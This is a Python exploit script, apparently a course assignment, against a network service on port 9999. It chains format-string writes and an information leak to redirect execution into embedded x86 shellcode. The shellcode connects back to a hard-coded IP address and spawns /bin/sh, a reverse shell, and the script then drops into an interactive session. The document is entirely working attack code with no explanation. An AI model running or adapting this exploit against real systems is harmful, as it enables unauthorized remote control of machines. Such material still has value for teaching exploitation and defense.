# python assign5payload.py 192.168.147.179 9999
import socket
import sys
import time
import telnetlib


def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact()

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server_address = (sys.argv[1], 9999)
print("Connecting to %s port %s" % server_address)
sock.connect(server_address)
time.sleep(1)
#                                                                                                   IP  192.168.  1.109
#                                                                                                   IP  172. 20.144.199 \xac\x14\x90\xc7
payload = "quitAAAA\x14\xa0\x04\x08\x16\xa0\x04\x08AAAAAAAAAAAAAAAAAAAA\x83\xec\x30\x31\xc0\x50\x50\xbb\xac\x10\x06\x70\x53\xbb\x03\x01\x30\x43\x66\x81\xf3\x01\x01\x53\x89\xe7\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66\x31\xdb\x43\xcd\x80\x6a\x10\x57\x50\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x5b\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\n"

name = "%34075c%14$hn%77$x\n"

#send the first input to name
sock.send(name)
time.sleep(1)

#send the payload
sock.send(payload)
time.sleep(1)

#receive the information leak
leakValue = sock.recv(100000)
print leakValue 

#use the leak to compute the address to use in the second input to main
address = leakValue[-15:-7]
print address 
leftPart = int(address[0:4], 16)
rightPart = int(address[4:], 16)
rightPart -= 260

if leftPart > rightPart:
	a = str(rightPart)
	b = str(leftPart - rightPart)
else:
	a = str(leftPart)
	b = str(rightPart - leftPart)

#second input to name 
name2 = "%" + a + "c%14$hn%" + b + "c%15$hn\n"

#send the second input to name
sock.send(name2)
time.sleep(1)

#have to send something for the echo buffer, so just reuse the payload
sock.send(payload)
time.sleep(1)


#name = "%56700c%14$hn%8835c%15$hn\n"

#raw_input("wait")
#encode = name.encode()
#sock.send(name)
#time.sleep(1)
#encode1 = payload.encode()
#sock.send(payload)
#time.sleep(1)
#sock.send(quit)
interact(sock)






